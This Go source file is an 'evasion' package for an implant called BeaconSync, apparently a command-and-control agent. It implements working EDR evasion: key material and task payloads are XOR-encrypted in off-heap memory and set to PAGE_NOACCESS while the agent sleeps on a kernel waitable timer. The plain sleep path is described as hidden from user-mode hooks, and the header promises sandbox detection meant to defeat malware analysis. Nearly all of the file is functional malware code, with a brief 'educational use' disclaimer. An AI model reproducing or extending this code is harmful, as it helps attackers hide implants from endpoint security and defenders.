// Package evasion provides endpoint detection and response (EDR) evasion
// techniques for the BeaconSync agent.
//
// Techniques:
//   - Sleep obfuscation: encrypt and page-protect sensitive memory regions
//     during heartbeat sleep so EDR memory scanners hit PAGE_NOACCESS instead
//     of readable key material.
//   - Sandbox detection: identify analysis environments and delay execution
//     to frustrate automated malware analysis.
//
// All techniques in this package are for educational use and authorized
// security testing only.
//
// # Architecture
//
// This package operates at the endpoint layer. The transport and scheduler
// layers handle network-level evasion. Together they form a defense-in-depth
// approach where the network channel is hard to detect and the endpoint
// process is hard to analyze.
package evasion

import (
	"crypto/rand"
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// =============================================================================
// MemoryRegion — off-heap secure memory block
// =============================================================================
//
// MemoryRegion wraps a VirtualAlloc'd block of memory that lives outside Go's
// managed heap. This has two consequences:
//
//   1. The Go GC will never scan this memory — no GC pauses, no pointer
//      tracing overhead, and crucially, the GC won't touch it during sleep.
//   2. We can safely change the page protection (RW → NOACCESS → RW) without
//      worrying about the Go runtime stumbling over protected pages.
//
// Use this for storing crypto keys, session state, and task payloads —
// anything that would be forensically valuable in a memory dump.

// MemoryRegion is a contiguous block of off-heap memory that supports
// page-protection switching for sleep obfuscation.
//
// The zero value is NOT usable; create one with NewMemoryRegion.
type MemoryRegion struct {
	addr uintptr
	size int // user-requested size (≤ allocated size)
}

// NewMemoryRegion allocates size bytes of off-heap committed memory via
// VirtualAlloc. The allocation is rounded up to the system page boundary
// (4 KiB on Windows x86_64).
//
// The returned region is zero-filled and backed by PAGE_READWRITE pages.
func NewMemoryRegion(size int) (*MemoryRegion, error) {
	if size <= 0 {
		return nil, fmt.Errorf("evasion: region size must be positive (got %d)", size)
	}

	pageSize := windows.Getpagesize()
	allocSize := roundUp(uintptr(size), uintptr(pageSize))

	addr, err := windows.VirtualAlloc(
		0,
		allocSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return nil, fmt.Errorf("evasion: VirtualAlloc(%d bytes) failed: %w", size, err)
	}

	return &MemoryRegion{
		addr: addr,
		size: size,
	}, nil
}

// Bytes returns a Go byte slice referencing the off-heap memory.
//
// The returned slice is backed by memory that the Go GC does NOT trace.
// Do NOT store Go heap pointers (interfaces, slices pointing to Go memory,
// strings, etc.) inside this buffer — the GC will not update them.
//
// The slice is valid until Close is called. Concurrent calls to Bytes
// from multiple goroutines are safe provided the caller serialises
// read/write access.
func (r *MemoryRegion) Bytes() []byte {
	if r.addr == 0 {
		return nil
	}
	return unsafe.Slice((*byte)(unsafe.Pointer(r.addr)), r.size)
}

// Close releases the underlying memory back to the OS. After Close, any
// slices obtained via Bytes become invalid (dangling pointers).
func (r *MemoryRegion) Close() error {
	if r.addr == 0 {
		return nil
	}
	err := windows.VirtualFree(r.addr, 0, windows.MEM_RELEASE)
	if err != nil {
		return err
	}
	r.addr = 0
	r.size = 0
	return nil
}

// =============================================================================
// ObfuscatedSleep — the core sleep obfuscation primitive
// =============================================================================

// regionSnap captures a memory region's state before sleep obfuscation.
// The XOR mask lives on the goroutine stack, not in the protected region.
type regionSnap struct {
	region *MemoryRegion
	mask   [64]byte
}

// ObfuscatedSleep encrypts the given regions with a random XOR mask, marks
// their pages as PAGE_NOACCESS, sleeps for the specified duration using a
// kernel waitable timer, then restores page protection and decrypts.
//
// During the sleep window:
//   - EDR memory scanners that touch the protected pages receive
//     STATUS_ACCESS_VIOLATION and cannot read the contents.
//   - The XOR mask lives on the calling goroutine's stack (which stays
//     accessible) but is semantically useless without the pre-XOR data.
//   - The goroutine is blocked in kernel mode (WaitForSingleObject) so no
//     user-mode code executes.
//
// Limitations (by design):
//   - This function BLOCKS the calling goroutine. It does not support
//     context-based cancellation. For cancellation, integrate via
//     WaitForMultipleObjects in a future iteration.
//   - Only the explicitly registered MemoryRegions are protected. The
//     Go runtime heap, stack, and code pages remain accessible.
//   - An attacker with a kernel debugger (ring 0) can still read the
//     protected pages, but this is true of all user-mode defenses.
func ObfuscatedSleep(d time.Duration, regions ...*MemoryRegion) error {
	if d <= 0 {
		return nil
	}
	if len(regions) == 0 {
		// Fall back to a plain kernel sleep when there's nothing to protect.
		// Still preferable to time.Sleep because WaitForSingleObject is
		// invisible to user-mode hooking.
		return kernelSleep(d)
	}

	// ── Phase 1: Encrypt ───────────────────────────────────────────────
	// Each region gets its own fresh 64-byte random XOR mask. The mask
	// lives on this goroutine's stack frame (not in the protected region)
	// so it remains readable during sleep.

	snapshots := make([]regionSnap, len(regions))
	for i, r := range regions {
		if _, err := rand.Read(snapshots[i].mask[:]); err != nil {
			return fmt.Errorf("evasion: rand.Read (mask) failed: %w", err)
		}
		snapshots[i].region = r
		xorInPlace(r.Bytes(), snapshots[i].mask[:])
	}

	// ── Phase 2: Protect ───────────────────────────────────────────────
	// Switch to PAGE_NOACCESS. After this point any access (read/write/
	// execute) raises STATUS_ACCESS_VIOLATION.

	for _, r := range regions {
		var old uint32
		if err := windows.VirtualProtect(
			r.addr,
			uintptr(r.size),
			windows.PAGE_NOACCESS,
			&old,
		); err != nil {
			// Unwind: restore + decrypt already-protected regions.
			unwindProtect(regions, snapshots)
			return fmt.Errorf("evasion: VirtualProtect(PAGE_NOACCESS) failed: %w", err)
		}
	}

	// ── Phase 3: Kernel sleep ──────────────────────────────────────────
	// WaitForSingleObject on a waitable timer blocks in kernel mode.
	// No user-mode code executes, no memory is touched.

	if err := kernelSleep(d); err != nil {
		unwindProtect(regions, snapshots)
		return err
	}

	// ── Phase 4: Restore protection ────────────────────────────────────

	for _, r := range regions {
		var old uint32
		if err := windows.VirtualProtect(
			r.addr,
			uintptr(r.size),
			windows.PAGE_READWRITE,
			&old,
		); err != nil {
			return fmt.Errorf("evasion: VirtualProtect(PAGE_READWRITE) failed: %w", err)
		}
	}

	// ── Phase 5: Decrypt ───────────────────────────────────────────────

	for i, sn := range snapshots {
		xorInPlace(sn.region.Bytes(), sn.mask[:])
		// Scrub the mask from the stack frame.
		for j := range snapshots[i].mask {
			snapshots[i].mask[j] = 0
		}
	}

	return nil
}

// =============================================================================
// Integration helpers
// =============================================================================

// ObfuscatedSleepFunc returns a func(time.Duration) suitable for wiring into
// the scheduler as a custom sleep hook.
//
// Example:
//
//	vault, _ := evasion.NewMemoryRegion(256)
//	// store keys in vault.Bytes()...
//	sched := scheduler.New(beaconFn,
//	    scheduler.WithCustomSleep(evasion.ObfuscatedSleepFunc(vault)),
//	)
func ObfuscatedSleepFunc(regions ...*MemoryRegion) func(time.Duration) {
	return func(d time.Duration) {
		_ = ObfuscatedSleep(d, regions...)
	}
}

// =============================================================================
// Internal helpers
// =============================================================================

// kernelSleep performs a plain kernel-mode sleep via WaitForSingleObject on
// a waitable timer. Unlike time.Sleep, this does not go through the Go
// scheduler's timer heap and is invisible to user-mode API hooks.
func kernelSleep(d time.Duration) error {
	hTimer, err := createWaitableTimer(nil, false, nil)
	if err != nil {
		return fmt.Errorf("evasion: CreateWaitableTimer failed: %w", err)
	}
	defer windows.CloseHandle(hTimer)

	// SetWaitableTimer with a negative due-time value uses relative time.
	// The value must be in 100-nanosecond intervals, packed as a FILETIME.
	//
	// Do NOT use NsecToFiletime here — it adds the 1601 epoch offset and
	// produces an absolute time. For relative waits we need a raw negative
	// value in 100ns units.
	hns := -int64(d) / 100 // negative → relative to now
	ft := windows.Filetime{
		LowDateTime:  uint32(hns & 0xffffffff),
		HighDateTime: uint32(hns >> 32),
	}

	if err := setWaitableTimer(hTimer, &ft, 0, 0, 0, false); err != nil {
		return fmt.Errorf("evasion: SetWaitableTimer failed: %w", err)
	}

	_, err = windows.WaitForSingleObject(hTimer, windows.INFINITE)
	if err != nil {
		return fmt.Errorf("evasion: WaitForSingleObject failed: %w", err)
	}

	return nil
}

// unwindProtect is called on the error path after some (but potentially not
// all) regions have been protected. It restores accessibility and decrypts.
func unwindProtect(regions []*MemoryRegion, snapshots []regionSnap) {
	for i, r := range regions {
		var old uint32
		// Best-effort — the page might not be protected yet.
		_ = windows.VirtualProtect(r.addr, uintptr(r.size), windows.PAGE_READWRITE, &old)
		xorInPlace(r.Bytes(), snapshots[i].mask[:])
	}
}

// xorInPlace XORs each byte of data with the cycling mask.
func xorInPlace(data []byte, mask []byte) {
	maskLen := len(mask)
	if maskLen == 0 {
		return
	}
	for i := range data {
		data[i] ^= mask[i%maskLen]
	}
}

// roundUp rounds x up to the nearest multiple of align.
func roundUp(x, align uintptr) uintptr {
	return (x + align - 1) &^ (align - 1)
}
